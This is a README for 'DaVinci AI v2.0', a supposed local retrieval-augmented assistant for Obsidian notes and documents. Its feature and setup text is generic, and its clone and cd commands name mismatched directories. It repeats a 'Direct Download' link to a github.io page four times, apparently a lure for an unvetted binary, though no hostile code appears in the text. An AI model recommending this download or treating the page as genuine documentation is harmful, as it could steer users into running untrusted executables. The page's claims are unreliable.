# DaVinci AI v2.0 - AI Knowledge Assistant and Research System 2026

> **DaVinci AI is a local web application for searching, analyzing, and researching personal documents and notes with retrieval-augmented generation, now at version 2.0.**

[![Platform](https://img.shields.io/badge/Platform-Local%20web%20application-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/adrianroth5/davinci-document-analyser-win-27200?style=flat-square)](https://github.com/adrianroth5/davinci-document-analyser-win-27200)

---

<p align="center">
  <a href="https://adrianroth5.github.io/davinci-document-analyser-win-27200/">
    <img src="https://img.shields.io/badge/Download-DaVinci%20AI%20Latest-brightgreen?style=for-the-badge" alt="Download DaVinci AI">
  </a>
</p>

> **[Direct Download - DaVinci AI v2.0](https://adrianroth5.github.io/davinci-document-analyser-win-27200/)**

---

[Download Latest Build](https://adrianroth5.github.io/davinci-document-analyser-win-27200/)

---

## About DaVinci AI

DaVinci AI brings local retrieval-augmented generation to personal knowledge workflows. It can index Obsidian vaults, Markdown notes, and common document formats so users can locate relevant material, explore connected information, and ask questions against their own collection.

The system combines semantic retrieval with document analysis and web research. Local Llama 3 inference through Ollama, ChromaDB vector storage, and background task processing provide a foundation for research workflows that can move between private notes, uploaded documents, search engines, and Wikipedia.

---

## Features

- Local-first question answering across private notes and indexed knowledge
- Live indexing for Obsidian vaults and Markdown files
- Analysis support for PDF, DOCX, and TXT documents
- Interactive document questioning and contextual retrieval
- Semantic search powered by ChromaDB vector storage
- Local Llama 3 inference through Ollama
- Intent-aware research using search engines and Wikipedia
- Autonomous web discovery and scraping workflows
- Persistent background research tasks with Huey and SQLite
- React and Next.js interfaces for different interaction styles

---

## Installation

Clone the repository and enter its project directory:

```bash
git clone https://github.com/adrianroth5/davinci-document-analyser-win-27200.git
cd davinci-document-analyser
```

DaVinci AI is designed to run as a local web application. Install the project dependencies, prepare the local Ollama model and supporting services described by the repository, then start the available web application entry point.

After launch, open the local address shown by the application in a browser.

---

## Usage

A typical workflow looks like this:

1. Start the local application and its required supporting services.
2. Connect or select an Obsidian vault, Markdown collection, or supported document source.
3. Allow the indexer to process the available files.
4. Search the collection with semantic queries.
5. Ask questions about an individual document or the broader indexed knowledge base.
6. Start a research task when additional web discovery is needed.
7. Review retrieved passages and research results in the web interface.

Example research prompts include:

- Find notes related to a selected topic.
- Summarize the main points in a PDF or DOCX file.
- Compare information across several indexed documents.
- Investigate a question using local notes, search engines, and Wikipedia.

---

## Configuration

Configuration depends on the selected application interface and local service setup. Before the first run, review the repository's configuration files and startup documentation for settings related to:

- Ollama and the local Llama 3 model
- ChromaDB storage
- SQLite and Huey background tasks
- Obsidian or Markdown source directories
- Document indexing and research behavior
- Web application host and port

Keep local paths and service details aligned with the environment where DaVinci AI is running.

---

## Requirements

- A system capable of running a local web application
- A compatible Python and JavaScript environment for the Flask, React, and Next.js components
- Ollama with access to a Llama 3 model for local inference
- Storage for indexed notes, documents, vector data, and research task state
- Source material in supported formats such as Obsidian notes, Markdown, PDF, DOCX, or TXT
- Network access when using web discovery, search engines, or Wikipedia research features

---

## FAQ

### What can DaVinci AI index?

It supports Obsidian and Markdown files, along with PDF, DOCX, and TXT documents.

### Does it use a remote language model?

The documented inference workflow uses Llama 3 locally through Ollama.

### Can I ask questions about one document?

Yes. The document analysis workflow supports interactive questions over indexed files.

### How does research work?

Research can combine local retrieval with intent-routed discovery through search engines and Wikipedia. Background work is managed with Huey and SQLite.

### Where is application configuration stored?

Review the repository configuration and startup files for paths, model settings, storage locations, and web server options.

### The index is incomplete. What should I check?

Confirm that the source directories are available, supported files can be read, the indexing process is running, and ChromaDB storage is accessible. For model-related issues, verify the Ollama service and selected Llama 3 model.

### How are updates delivered?

Use the repository's latest build or update the local checkout, then review any release or setup notes before restarting the application.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
